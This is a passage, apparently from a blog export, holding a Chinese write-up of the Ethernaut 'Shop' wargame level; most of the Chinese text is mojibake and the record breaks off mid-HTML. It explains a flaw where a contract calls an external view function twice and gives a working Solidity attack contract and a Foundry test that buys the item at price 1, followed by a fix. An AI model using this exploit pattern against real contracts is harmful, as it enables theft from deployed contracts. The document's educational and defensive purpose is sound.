å¤–éƒ¨è°ƒç”¨çŠ¶æ€å˜åŒ– / ä¼ª `view` å‡½æ•°  \n> **éš¾åº¦**: â­â­â˜†â˜†â˜†\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\nä½ éœ€è¦ä» `Shop` åˆçº¦ä¸­ä¹°ä¸‹å•†å“ã€‚ä½†æœ‰ä¸€ä¸ªæ¡ä»¶ï¼šä½ å¿…é¡»ä»¥ä½äºåŸä»·ï¼ˆ100ï¼‰çš„ä»·æ ¼ä¹°ä¸‹å®ƒã€‚æœ€ç»ˆç›®æ ‡æ˜¯è®© `price` å˜é‡çš„å€¼å°äº100ï¼Œå¹¶ä¸” `isSold` ä¸º `true`ã€‚\n\n![Shop Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel21.svg)\n\n## ğŸ” æ¼æ´åˆ†æ\n\nè®©æˆ‘ä»¬çœ‹ä¸€ä¸‹ `Shop` åˆçº¦çš„ `buy()` å‡½æ•°ï¼š\n\n```solidity\ncontract Shop {\n    uint public price = 100;\n    bool public isSold;\n\n    function buy() public {\n        Buyer _buyer = Buyer(msg.sender);\n\n        if (_buyer.price() >= price && !isSold) {\n            isSold = true;\n            price = _buyer.price();\n        }\n    }\n}\n\n// The interface the buyer must implement\ninterface Buyer {\n    function price() external view returns (uint);\n}\n```\n\næ¼æ´åœ¨äº `buy()` å‡½æ•°å¯¹å¤–éƒ¨åˆçº¦ `_buyer` çš„ `price()` å‡½æ•°è¿›è¡Œäº†ä¸¤æ¬¡è°ƒç”¨ï¼š\n\n1.  **ç¬¬ä¸€æ¬¡è°ƒç”¨**: åœ¨ `if` æ¡ä»¶åˆ¤æ–­ä¸­ `_buyer.price() >= price`ã€‚\n2.  **ç¬¬äºŒæ¬¡è°ƒç”¨**: åœ¨ `if` å—å†…éƒ¨ï¼Œç”¨äºæ›´æ–° `price` å˜é‡ `price = _buyer.price()`ã€‚\n\n`Buyer` æ¥å£å°† `price()` å‡½æ•°æ ‡è®°ä¸º `view`ï¼Œè¿™é€šå¸¸æ„å‘³ç€è¯¥å‡½æ•°ä¸åº”æ”¹å˜çŠ¶æ€ã€‚ç„¶è€Œï¼ŒEVM **å¹¶ä¸å¼ºåˆ¶ `view` å‡½æ•°ä¸èƒ½ä¾èµ–äºçŠ¶æ€**ã€‚ä¸€ä¸ªå¤–éƒ¨åˆçº¦çš„ `view` å‡½æ•°å®Œå…¨å¯ä»¥åœ¨ä¸¤æ¬¡è°ƒç”¨ä¹‹é—´è¿”å›ä¸åŒçš„å€¼ï¼Œåªè¦å®ƒçš„è¿”å›å€¼ä¾èµ–äºæŸäº›åœ¨ä¸¤æ¬¡è°ƒç”¨ä¹‹é—´å‘ç”Ÿå˜åŒ–çš„çŠ¶æ€ã€‚\n\næˆ‘ä»¬çš„æ”»å‡»æ€è·¯å¦‚ä¸‹ï¼š\n\n1.  åˆ›å»ºä¸€ä¸ªæ”»å‡»åˆçº¦ï¼Œå®ç° `Buyer` æ¥å£ã€‚\n2.  åœ¨æ”»å‡»åˆçº¦çš„ `price()` å‡½æ•°ä¸­åŠ å…¥é€»è¾‘ï¼šå¦‚æœ `Shop` åˆçº¦çš„ `isSold` çŠ¶æ€ä¸º `false`ï¼Œåˆ™è¿”å›ä¸€ä¸ªå¤§äºæˆ–ç­‰äº100çš„å€¼ï¼ˆä¾‹å¦‚101ï¼‰ï¼Œä»¥é€šè¿‡ `if` æ£€æŸ¥ã€‚å¦‚æœ `isSold` ä¸º `true`ï¼Œåˆ™è¿”å›ä¸€ä¸ªå°äº100çš„å€¼ï¼ˆä¾‹å¦‚1ï¼‰ã€‚\n3.  å½“æˆ‘ä»¬è°ƒç”¨ `buy()` æ—¶ï¼š\n    *   `if` æ¡ä»¶æ£€æŸ¥ï¼š`isSold` æ˜¯ `false`ï¼Œæˆ‘ä»¬çš„ `price()` è¿”å› `101`ã€‚`101 >= 100` ä¸ºçœŸï¼Œæ£€æŸ¥é€šè¿‡ã€‚\n    *   è¿›å…¥ `if` å—ï¼š`isSold` è¢«è®¾ç½®ä¸º `true`ã€‚\n    *   æ›´æ–° `price`ï¼š`price = _buyer.price()` è¢«è°ƒç”¨ã€‚æ­¤æ—¶ `isSold` å·²ç»æ˜¯ `true`ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„ `price()` å‡½æ•°è¿”å› `1`ã€‚`Shop` åˆçº¦çš„ `price` å˜é‡è¢«æ›´æ–°ä¸º `1`ã€‚\n\nè¿™æ ·ï¼Œæˆ‘ä»¬å°±æˆåŠŸåœ°ä»¥ä½ä»·ä¹°ä¸‹äº†å•†å“ã€‚\n\n## ğŸ’» Foundry å®ç°\n\n### æ”»å‡»åˆçº¦ä»£ç \n\næ”»å‡»åˆçº¦å®ç°äº† `Buyer` æ¥å£ï¼Œå…¶ `price()` å‡½æ•°æ ¹æ® `Shop` åˆçº¦çš„ `isSold` çŠ¶æ€è¿”å›ä¸åŒçš„å€¼ã€‚\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IShop {\n    function isSold() external view returns (bool);\n    function price() external view returns (uint);\n    function buy() external;\n}\n\ncontract Attack {\n    IShop shop;\n\n    constructor(address _shopAddress) {\n        shop = IShop(_shopAddress);\n    }\n\n    // è¿™ä¸ª price å‡½æ•°æ˜¯æ”»å‡»çš„æ ¸å¿ƒ\n    function price() public view returns (uint256) {\n        // å¦‚æœå•†å“è¿˜æ²¡å–å‡ºï¼Œè¿”å›é«˜ä»·ä»¥é€šè¿‡æ£€æŸ¥\n        // å¦‚æœå·²ç»å–å‡ºï¼ˆåœ¨åŒä¸€æ¬¡ buy è°ƒç”¨ä¸­ï¼‰ï¼Œè¿”å›ä½ä»·æ¥æ›´æ–° price\n        if (shop.isSold()) {\n            return 1;\n        } else {\n            return 101;\n        }\n    }\n\n    function attack() public {\n        shop.buy();\n    }\n}\n```\n\n### Foundry æµ‹è¯•ä»£ç \n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/21_Shop.sol\";\n\n// Attack contract (as defined above)\ncontract Attack {\n    IShop shop;\n    constructor(address _shop) { shop = IShop(_shop); }\n    function price() public view returns (uint256) { return shop.isSold() ? 1 : 101; }\n    function attack() public { shop.buy(); }\n}\n\ncontract ShopTest is Test {\n    Shop instance;\n    Attack attacker;\n    address player;\n\n    function setUp() public {\n        player = vm.addr(1);\n        instance = new Shop();\n        attacker = new Attack(address(instance));\n    }\n\n    function testAttack() public {\n        vm.startPrank(player);\n        attacker.attack();\n        vm.stopPrank();\n\n        // éªŒè¯æ”»å‡»æ˜¯å¦æˆåŠŸ\n        assertEq(instance.price(), 1, \"Price should be updated to 1\");\n        assertTrue(instance.isSold(), \"isSold should be true\");\n    }\n}\n```\n\n### å…³é”®æ”»å‡»æ­¥éª¤\n\n1.  **éƒ¨ç½²æ”»å‡»åˆçº¦**: åˆ›å»º `Attack` åˆçº¦ï¼Œå®ƒå®ç°äº† `Buyer` æ¥å£ã€‚\n2.  **è°ƒç”¨ `attack()`**: `Attack` åˆçº¦çš„ `attack()` å‡½æ•°è°ƒç”¨ `Shop` åˆçº¦çš„ `buy()` å‡½æ•°ã€‚\n3.  **åŒé‡è¿”å›å€¼**: `Shop` åˆçº¦åœ¨åŒä¸€æ¬¡ `buy()` è°ƒç”¨ä¸­ä¸¤æ¬¡è°ƒç”¨ `Attack` åˆçº¦çš„ `price()` å‡½æ•°ï¼Œä½†ç”±äº `Shop` çš„å†…éƒ¨çŠ¶æ€ `isSold` å‘ç”Ÿäº†å˜åŒ–ï¼Œ`Attack` çš„ `price()` å‡½æ•°è¿”å›äº†ä¸¤ä¸ªä¸åŒçš„å€¼ï¼Œä»è€Œç»•è¿‡äº†é€»è¾‘æ£€æŸ¥å¹¶ä»¥ä½ä»·æˆäº¤ã€‚\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n1.  **ä¸è¦åœ¨ä¸€æ¬¡äº¤æ˜“ä¸­å¤šæ¬¡è°ƒç”¨å¤–éƒ¨ `view` å‡½æ•°**: å¦‚æœå¿…é¡»è¿™æ ·åšï¼Œè¯·å°†ç¬¬ä¸€æ¬¡è°ƒç”¨çš„è¿”å›å€¼å­˜å‚¨åœ¨ä¸€ä¸ªå±€éƒ¨å˜é‡ä¸­ï¼Œå¹¶åœ¨åç»­é€»è¾‘ä¸­ä½¿ç”¨è¿™ä¸ªå±€éƒ¨å˜é‡ï¼Œè€Œä¸æ˜¯å†æ¬¡è¿›è¡Œå¤–éƒ¨è°ƒç”¨ã€‚\n\n    ```solidity\n    // ä¿®å¤å»ºè®®\n    function buy() public {\n        Buyer _buyer = Buyer(msg.sender);\n        uint _price = _buyer.price(); // åªè°ƒç”¨ä¸€æ¬¡ï¼Œå¹¶å°†ç»“æœå­˜å…¥å±€éƒ¨å˜é‡\n\n        if (_price >= price && !isSold) {\n            isSold = true;\n            price = _price; // ä½¿ç”¨å±€éƒ¨å˜é‡\n        }\n    }\n    ```\n\n2.  **éµå¾ªâ€œæ£€æŸ¥-ç”Ÿæ•ˆ-äº¤äº’â€æ¨¡å¼**: å°½ç®¡æœ¬ä¾‹ä¸­çš„äº¤äº’æ˜¯ä¸€ä¸ª `view` å‡½æ•°ï¼Œä½†å®ƒä»ç„¶æ˜¯ä¸å¤–éƒ¨åˆçº¦çš„äº¤äº’ã€‚æœ€ä½³å®è·µæ˜¯åœ¨æ‰€æœ‰çŠ¶æ€å˜æ›´ï¼ˆâ€œç”Ÿæ•ˆâ€ï¼‰ä¹‹åå†è¿›è¡Œäº¤äº’ã€‚ç„¶è€Œï¼Œåœ¨æœ¬ä¾‹ä¸­ï¼Œæ›´å¥½çš„ä¿®å¤æ–¹æ³•æ˜¯ç¼“å­˜è¿”å›å€¼ã€‚\n\n## ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\n\n-   **`view` å‡½æ•°çš„è¯¯è§£**: `view` å…³é”®å­—åªå‘ç¼–è¯‘å™¨æ‰¿è¯ºè¯¥å‡½æ•°ä¸ä¼šä¿®æ”¹çŠ¶æ€ã€‚å®ƒå¹¶ä¸ä¿è¯å‡½æ•°çš„è¿”å›å€¼æ˜¯çº¯ç²¹çš„æˆ–åœ¨ä¸€æ¬¡äº¤æ˜“ä¸­ä¿æŒä¸å˜ã€‚\n-   **è·¨åˆçº¦è°ƒç”¨çš„çŠ¶æ€ä¾èµ–**: ä¸€ä¸ªåˆçº¦çš„å‡½æ•°å¯ä»¥ä¾èµ–äºå¦ä¸€ä¸ªåˆçº¦çš„çŠ¶æ€ï¼Œè¿™å¯èƒ½å¯¼è‡´åƒæœ¬ä¾‹ä¸­è¿™æ ·æ„æƒ³ä¸åˆ°çš„è¡Œä¸ºã€‚\n-   **Foundry `prank`**: æ¨¡æ‹Ÿæ¥è‡ªç‰¹å®šåœ°å€ï¼ˆ`player` -> `attacker`ï¼‰çš„è°ƒç”¨é“¾ï¼Œæ˜¯æµ‹è¯•æ­¤ç±»äº¤äº’å¼æ”»å‡»çš„ç†æƒ³å·¥å…·ã€‚\n\n## ğŸ¯ æ€»ç»“\n\n**æ ¸å¿ƒæ¦‚å¿µ**:\n-   å¤–éƒ¨ `view` å‡½æ•°çš„è¿”å›å€¼ä¸æ˜¯æ’å®šçš„ï¼Œå®ƒå¯ä»¥åœ¨ä¸€æ¬¡äº¤æ˜“çš„ä¸åŒé˜¶æ®µå‘ç”Ÿå˜åŒ–ã€‚\n-   åœ¨ä¸€æ¬¡å‡½æ•°æ‰§è¡Œä¸­å¤šæ¬¡è°ƒç”¨åŒä¸€ä¸ªå¤–éƒ¨ `view` å‡½æ•°æ˜¯ä¸€ä¸ªå±é™©çš„æ¨¡å¼ï¼Œå› ä¸ºå®ƒçš„è¿”å›å€¼å¯èƒ½åœ¨ä½ æ„æƒ³ä¸åˆ°çš„æ—¶å€™å‘ç”Ÿæ”¹å˜ã€‚\n\n**æ”»å‡»å‘é‡**:\n-   è®¾è®¡ä¸€ä¸ªæ¶æ„çš„ `view` å‡½æ•°ï¼Œä½¿å…¶æ ¹æ®ç›®æ ‡åˆçº¦çš„çŠ¶æ€è¿”å›ä¸åŒçš„å€¼ã€‚\n-   åˆ©ç”¨ç›®æ ‡åˆçº¦åœ¨æ£€æŸ¥å’Œæ‰§è¡Œé˜¶æ®µä¹‹é—´çŠ¶æ€çš„å˜åŒ–ï¼Œæ¥æ“çºµ `view` å‡½æ•°çš„è¿”å›å€¼ï¼Œä»è€Œç»•è¿‡å®‰å…¨æ£€æŸ¥ã€‚\n\n**é˜²å¾¡ç­–ç•¥**:\n-   å½“éœ€è¦å¤šæ¬¡ä½¿ç”¨å¤–éƒ¨è°ƒç”¨çš„ç»“æœæ—¶ï¼Œåº”å°†å…¶ç¼“å­˜åœ¨ä¸€ä¸ªå±€éƒ¨å˜é‡ä¸­ï¼Œä»¥ç¡®ä¿å…¶åœ¨æ•´ä¸ªå‡½æ•°æ‰§è¡Œè¿‡ç¨‹ä¸­çš„ä¸€è‡´æ€§ã€‚\n\n## ğŸ“š å‚è€ƒèµ„æ–™\n\n-   [Solidity Docs: View Functions](https://docs.soliditylang.org/en/latest/contracts.html#view-functions)\n-   [SWC-113: DoS with Failed Call](https://swcregistry.io/docs/SWC-113) (è™½ç„¶ä¸æ˜¯ç›´æ¥çš„DoSï¼Œä½†åŸç†ç›¸ä¼¼ï¼Œéƒ½æ¶‰åŠåˆ°å¯¹å¤–éƒ¨è°ƒç”¨ç»“æœçš„é”™è¯¯å¤„ç†)","source":"_posts/ethernaut-level-21-shop.md","raw":"---\ntitle: 'Ethernaut Level 21: Shop - å¤–éƒ¨è°ƒç”¨çŠ¶æ€å˜åŒ–æ¼æ´'\ndate: 2025-01-25 16:50:00\nupdated: 2025-01-25 16:50:00\ncategories:\n  - Ethernaut ç³»åˆ—\n  - é«˜çº§æ”»å‡»ç¯‡ (21-25)\ntags:\n  - Ethernaut\n  - Foundry\n  - Reentrancy\n  - View Function\n  - æ™ºèƒ½åˆçº¦å®‰å…¨\n  - Solidity\nseries: Ethernaut Foundry Solutions\nexcerpt: \"åˆ©ç”¨ä¸€ä¸ªçœ‹ä¼¼æ˜¯ `view` çš„å¤–éƒ¨è°ƒç”¨å‡½æ•°åœ¨ä¸¤æ¬¡è°ƒç”¨ä¹‹é—´æ”¹å˜çŠ¶æ€ï¼Œä»è€Œç»•è¿‡å®‰å…¨æ£€æŸ¥ã€‚å­¦ä¹ å¦‚ä½•è®¾è®¡ä¸€ä¸ªåœ¨ä¸åŒè°ƒç”¨ä¸­è¿”å›ä¸åŒå€¼çš„ `price()` å‡½æ•°ï¼Œä»¥ä½äºé¢„æœŸçš„ä»·æ ¼ä¹°ä¸‹å•†å“ï¼ŒæŒæ¡ Shop å…³å¡çš„ç ´è§£æŠ€å·§ã€‚\"\n---\n\n# ğŸ¯ Ethernaut Level 21: Shop - å¤–éƒ¨è°ƒç”¨çŠ¶æ€å˜åŒ–æ¼æ´\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 21 - Shop](https://ethernaut.openzeppelin.com/level/21)  \n> **æ”»å‡»ç±»å‹**: å¤–éƒ¨è°ƒç”¨çŠ¶æ€å˜åŒ– / ä¼ª `view` å‡½æ•°  \n> **éš¾åº¦**: â­â­â˜†â˜†â˜†\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\nä½ éœ€è¦ä» `Shop` åˆçº¦ä¸­ä¹°ä¸‹å•†å“ã€‚ä½†æœ‰ä¸€ä¸ªæ¡ä»¶ï¼šä½ å¿…é¡»ä»¥ä½äºåŸä»·ï¼ˆ100ï¼‰çš„ä»·æ ¼ä¹°ä¸‹å®ƒã€‚æœ€ç»ˆç›®æ ‡æ˜¯è®© `price` å˜é‡çš„å€¼å°äº100ï¼Œå¹¶ä¸” `isSold` ä¸º `true`ã€‚\n\n![Shop Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel21.svg)\n\n## ğŸ” æ¼æ´åˆ†æ\n\nè®©æˆ‘ä»¬çœ‹ä¸€ä¸‹ `Shop` åˆçº¦çš„ `buy()` å‡½æ•°ï¼š\n\n```solidity\ncontract Shop {\n    uint public price = 100;\n    bool public isSold;\n\n    function buy() public {\n        Buyer _buyer = Buyer(msg.sender);\n\n        if (_buyer.price() >= price && !isSold) {\n            isSold = true;\n            price = _buyer.price();\n        }\n    }\n}\n\n// The interface the buyer must implement\ninterface Buyer {\n    function price() external view returns (uint);\n}\n```\n\næ¼æ´åœ¨äº `buy()` å‡½æ•°å¯¹å¤–éƒ¨åˆçº¦ `_buyer` çš„ `price()` å‡½æ•°è¿›è¡Œäº†ä¸¤æ¬¡è°ƒç”¨ï¼š\n\n1.  **ç¬¬ä¸€æ¬¡è°ƒç”¨**: åœ¨ `if` æ¡ä»¶åˆ¤æ–­ä¸­ `_buyer.price() >= price`ã€‚\n2.  **ç¬¬äºŒæ¬¡è°ƒç”¨**: åœ¨ `if` å—å†…éƒ¨ï¼Œç”¨äºæ›´æ–° `price` å˜é‡ `price = _buyer.price()`ã€‚\n\n`Buyer` æ¥å£å°† `price()` å‡½æ•°æ ‡è®°ä¸º `view`ï¼Œè¿™é€šå¸¸æ„å‘³ç€è¯¥å‡½æ•°ä¸åº”æ”¹å˜çŠ¶æ€ã€‚ç„¶è€Œï¼ŒEVM **å¹¶ä¸å¼ºåˆ¶ `view` å‡½æ•°ä¸èƒ½ä¾èµ–äºçŠ¶æ€**ã€‚ä¸€ä¸ªå¤–éƒ¨åˆçº¦çš„ `view` å‡½æ•°å®Œå…¨å¯ä»¥åœ¨ä¸¤æ¬¡è°ƒç”¨ä¹‹é—´è¿”å›ä¸åŒçš„å€¼ï¼Œåªè¦å®ƒçš„è¿”å›å€¼ä¾èµ–äºæŸäº›åœ¨ä¸¤æ¬¡è°ƒç”¨ä¹‹é—´å‘ç”Ÿå˜åŒ–çš„çŠ¶æ€ã€‚\n\næˆ‘ä»¬çš„æ”»å‡»æ€è·¯å¦‚ä¸‹ï¼š\n\n1.  åˆ›å»ºä¸€ä¸ªæ”»å‡»åˆçº¦ï¼Œå®ç° `Buyer` æ¥å£ã€‚\n2.  åœ¨æ”»å‡»åˆçº¦çš„ `price()` å‡½æ•°ä¸­åŠ å…¥é€»è¾‘ï¼šå¦‚æœ `Shop` åˆçº¦çš„ `isSold` çŠ¶æ€ä¸º `false`ï¼Œåˆ™è¿”å›ä¸€ä¸ªå¤§äºæˆ–ç­‰äº100çš„å€¼ï¼ˆä¾‹å¦‚101ï¼‰ï¼Œä»¥é€šè¿‡ `if` æ£€æŸ¥ã€‚å¦‚æœ `isSold` ä¸º `true`ï¼Œåˆ™è¿”å›ä¸€ä¸ªå°äº100çš„å€¼ï¼ˆä¾‹å¦‚1ï¼‰ã€‚\n3.  å½“æˆ‘ä»¬è°ƒç”¨ `buy()` æ—¶ï¼š\n    *   `if` æ¡ä»¶æ£€æŸ¥ï¼š`isSold` æ˜¯ `false`ï¼Œæˆ‘ä»¬çš„ `price()` è¿”å› `101`ã€‚`101 >= 100` ä¸ºçœŸï¼Œæ£€æŸ¥é€šè¿‡ã€‚\n    *   è¿›å…¥ `if` å—ï¼š`isSold` è¢«è®¾ç½®ä¸º `true`ã€‚\n    *   æ›´æ–° `price`ï¼š`price = _buyer.price()` è¢«è°ƒç”¨ã€‚æ­¤æ—¶ `isSold` å·²ç»æ˜¯ `true`ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„ `price()` å‡½æ•°è¿”å› `1`ã€‚`Shop` åˆçº¦çš„ `price` å˜é‡è¢«æ›´æ–°ä¸º `1`ã€‚\n\nè¿™æ ·ï¼Œæˆ‘ä»¬å°±æˆåŠŸåœ°ä»¥ä½ä»·ä¹°ä¸‹äº†å•†å“ã€‚\n\n## ğŸ’» Foundry å®ç°\n\n### æ”»å‡»åˆçº¦ä»£ç \n\næ”»å‡»åˆçº¦å®ç°äº† `Buyer` æ¥å£ï¼Œå…¶ `price()` å‡½æ•°æ ¹æ® `Shop` åˆçº¦çš„ `isSold` çŠ¶æ€è¿”å›ä¸åŒçš„å€¼ã€‚\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IShop {\n    function isSold() external view returns (bool);\n    function price() external view returns (uint);\n    function buy() external;\n}\n\ncontract Attack {\n    IShop shop;\n\n    constructor(address _shopAddress) {\n        shop = IShop(_shopAddress);\n    }\n\n    // è¿™ä¸ª price å‡½æ•°æ˜¯æ”»å‡»çš„æ ¸å¿ƒ\n    function price() public view returns (uint256) {\n        // å¦‚æœå•†å“è¿˜æ²¡å–å‡ºï¼Œè¿”å›é«˜ä»·ä»¥é€šè¿‡æ£€æŸ¥\n        // å¦‚æœå·²ç»å–å‡ºï¼ˆåœ¨åŒä¸€æ¬¡ buy è°ƒç”¨ä¸­ï¼‰ï¼Œè¿”å›ä½ä»·æ¥æ›´æ–° price\n        if (shop.isSold()) {\n            return 1;\n        } else {\n            return 101;\n        }\n    }\n\n    function attack() public {\n        shop.buy();\n    }\n}\n```\n\n### Foundry æµ‹è¯•ä»£ç \n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/21_Shop.sol\";\n\n// Attack contract (as defined above)\ncontract Attack {\n    IShop shop;\n    constructor(address _shop) { shop = IShop(_shop); }\n    function price() public view returns (uint256) { return shop.isSold() ? 1 : 101; }\n    function attack() public { shop.buy(); }\n}\n\ncontract ShopTest is Test {\n    Shop instance;\n    Attack attacker;\n    address player;\n\n    function setUp() public {\n        player = vm.addr(1);\n        instance = new Shop();\n        attacker = new Attack(address(instance));\n    }\n\n    function testAttack() public {\n        vm.startPrank(player);\n        attacker.attack();\n        vm.stopPrank();\n\n        // éªŒè¯æ”»å‡»æ˜¯å¦æˆåŠŸ\n        assertEq(instance.price(), 1, \"Price should be updated to 1\");\n        assertTrue(instance.isSold(), \"isSold should be true\");\n    }\n}\n```\n\n### å…³é”®æ”»å‡»æ­¥éª¤\n\n1.  **éƒ¨ç½²æ”»å‡»åˆçº¦**: åˆ›å»º `Attack` åˆçº¦ï¼Œå®ƒå®ç°äº† `Buyer` æ¥å£ã€‚\n2.  **è°ƒç”¨ `attack()`**: `Attack` åˆçº¦çš„ `attack()` å‡½æ•°è°ƒç”¨ `Shop` åˆçº¦çš„ `buy()` å‡½æ•°ã€‚\n3.  **åŒé‡è¿”å›å€¼**: `Shop` åˆçº¦åœ¨åŒä¸€æ¬¡ `buy()` è°ƒç”¨ä¸­ä¸¤æ¬¡è°ƒç”¨ `Attack` åˆçº¦çš„ `price()` å‡½æ•°ï¼Œä½†ç”±äº `Shop` çš„å†…éƒ¨çŠ¶æ€ `isSold` å‘ç”Ÿäº†å˜åŒ–ï¼Œ`Attack` çš„ `price()` å‡½æ•°è¿”å›äº†ä¸¤ä¸ªä¸åŒçš„å€¼ï¼Œä»è€Œç»•è¿‡äº†é€»è¾‘æ£€æŸ¥å¹¶ä»¥ä½ä»·æˆäº¤ã€‚\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n1.  **ä¸è¦åœ¨ä¸€æ¬¡äº¤æ˜“ä¸­å¤šæ¬¡è°ƒç”¨å¤–éƒ¨ `view` å‡½æ•°**: å¦‚æœå¿…é¡»è¿™æ ·åšï¼Œè¯·å°†ç¬¬ä¸€æ¬¡è°ƒç”¨çš„è¿”å›å€¼å­˜å‚¨åœ¨ä¸€ä¸ªå±€éƒ¨å˜é‡ä¸­ï¼Œå¹¶åœ¨åç»­é€»è¾‘ä¸­ä½¿ç”¨è¿™ä¸ªå±€éƒ¨å˜é‡ï¼Œè€Œä¸æ˜¯å†æ¬¡è¿›è¡Œå¤–éƒ¨è°ƒç”¨ã€‚\n\n    ```solidity\n    // ä¿®å¤å»ºè®®\n    function buy() public {\n        Buyer _buyer = Buyer(msg.sender);\n        uint _price = _buyer.price(); // åªè°ƒç”¨ä¸€æ¬¡ï¼Œå¹¶å°†ç»“æœå­˜å…¥å±€éƒ¨å˜é‡\n\n        if (_price >= price && !isSold) {\n            isSold = true;\n            price = _price; // ä½¿ç”¨å±€éƒ¨å˜é‡\n        }\n    }\n    ```\n\n2.  **éµå¾ªâ€œæ£€æŸ¥-ç”Ÿæ•ˆ-äº¤äº’â€æ¨¡å¼**: å°½ç®¡æœ¬ä¾‹ä¸­çš„äº¤äº’æ˜¯ä¸€ä¸ª `view` å‡½æ•°ï¼Œä½†å®ƒä»ç„¶æ˜¯ä¸å¤–éƒ¨åˆçº¦çš„äº¤äº’ã€‚æœ€ä½³å®è·µæ˜¯åœ¨æ‰€æœ‰çŠ¶æ€å˜æ›´ï¼ˆâ€œç”Ÿæ•ˆâ€ï¼‰ä¹‹åå†è¿›è¡Œäº¤äº’ã€‚ç„¶è€Œï¼Œåœ¨æœ¬ä¾‹ä¸­ï¼Œæ›´å¥½çš„ä¿®å¤æ–¹æ³•æ˜¯ç¼“å­˜è¿”å›å€¼ã€‚\n\n## ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\n\n-   **`view` å‡½æ•°çš„è¯¯è§£**: `view` å…³é”®å­—åªå‘ç¼–è¯‘å™¨æ‰¿è¯ºè¯¥å‡½æ•°ä¸ä¼šä¿®æ”¹çŠ¶æ€ã€‚å®ƒå¹¶ä¸ä¿è¯å‡½æ•°çš„è¿”å›å€¼æ˜¯çº¯ç²¹çš„æˆ–åœ¨ä¸€æ¬¡äº¤æ˜“ä¸­ä¿æŒä¸å˜ã€‚\n-   **è·¨åˆçº¦è°ƒç”¨çš„çŠ¶æ€ä¾èµ–**: ä¸€ä¸ªåˆçº¦çš„å‡½æ•°å¯ä»¥ä¾èµ–äºå¦ä¸€ä¸ªåˆçº¦çš„çŠ¶æ€ï¼Œè¿™å¯èƒ½å¯¼è‡´åƒæœ¬ä¾‹ä¸­è¿™æ ·æ„æƒ³ä¸åˆ°çš„è¡Œä¸ºã€‚\n-   **Foundry `prank`**: æ¨¡æ‹Ÿæ¥è‡ªç‰¹å®šåœ°å€ï¼ˆ`player` -> `attacker`ï¼‰çš„è°ƒç”¨é“¾ï¼Œæ˜¯æµ‹è¯•æ­¤ç±»äº¤äº’å¼æ”»å‡»çš„ç†æƒ³å·¥å…·ã€‚\n\n## ğŸ¯ æ€»ç»“\n\n**æ ¸å¿ƒæ¦‚å¿µ**:\n-   å¤–éƒ¨ `view` å‡½æ•°çš„è¿”å›å€¼ä¸æ˜¯æ’å®šçš„ï¼Œå®ƒå¯ä»¥åœ¨ä¸€æ¬¡äº¤æ˜“çš„ä¸åŒé˜¶æ®µå‘ç”Ÿå˜åŒ–ã€‚\n-   åœ¨ä¸€æ¬¡å‡½æ•°æ‰§è¡Œä¸­å¤šæ¬¡è°ƒç”¨åŒä¸€ä¸ªå¤–éƒ¨ `view` å‡½æ•°æ˜¯ä¸€ä¸ªå±é™©çš„æ¨¡å¼ï¼Œå› ä¸ºå®ƒçš„è¿”å›å€¼å¯èƒ½åœ¨ä½ æ„æƒ³ä¸åˆ°çš„æ—¶å€™å‘ç”Ÿæ”¹å˜ã€‚\n\n**æ”»å‡»å‘é‡**:\n-   è®¾è®¡ä¸€ä¸ªæ¶æ„çš„ `view` å‡½æ•°ï¼Œä½¿å…¶æ ¹æ®ç›®æ ‡åˆçº¦çš„çŠ¶æ€è¿”å›ä¸åŒçš„å€¼ã€‚\n-   åˆ©ç”¨ç›®æ ‡åˆçº¦åœ¨æ£€æŸ¥å’Œæ‰§è¡Œé˜¶æ®µä¹‹é—´çŠ¶æ€çš„å˜åŒ–ï¼Œæ¥æ“çºµ `view` å‡½æ•°çš„è¿”å›å€¼ï¼Œä»è€Œç»•è¿‡å®‰å…¨æ£€æŸ¥ã€‚\n\n**é˜²å¾¡ç­–ç•¥**:\n-   å½“éœ€è¦å¤šæ¬¡ä½¿ç”¨å¤–éƒ¨è°ƒç”¨çš„ç»“æœæ—¶ï¼Œåº”å°†å…¶ç¼“å­˜åœ¨ä¸€ä¸ªå±€éƒ¨å˜é‡ä¸­ï¼Œä»¥ç¡®ä¿å…¶åœ¨æ•´ä¸ªå‡½æ•°æ‰§è¡Œè¿‡ç¨‹ä¸­çš„ä¸€è‡´æ€§ã€‚\n\n## ğŸ“š å‚è€ƒèµ„æ–™\n\n-   [Solidity Docs: View Functions](https://docs.soliditylang.org/en/latest/contracts.html#view-functions)\n-   [SWC-113: DoS with Failed Call](https://swcregistry.io/docs/SWC-113) (è™½ç„¶ä¸æ˜¯ç›´æ¥çš„DoSï¼Œä½†åŸç†ç›¸ä¼¼ï¼Œéƒ½æ¶‰åŠåˆ°å¯¹å¤–éƒ¨è°ƒç”¨ç»“æœçš„é”™è¯¯å¤„ç†)","slug":"ethernaut-level-21-shop","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbpi001ibf5q5lkbdbaw","content":"<h1 id=\"ğŸ¯-Ethernaut-Level-21-Shop-å¤–éƒ¨è°ƒç”¨çŠ¶æ€å˜åŒ–æ¼æ´\"><a href=\"#ğŸ¯-Ethernaut-Level-21-Shop-å¤–éƒ¨è°ƒç”¨çŠ¶æ€å˜åŒ–æ¼æ´\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 21: Shop - å¤–éƒ¨è°ƒç”¨çŠ¶æ€å˜åŒ–æ¼æ´\"></a>ğŸ¯ Ethernaut Level 21: Shop - å¤–éƒ¨è°ƒç”¨çŠ¶æ€å˜åŒ–æ¼æ´</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a 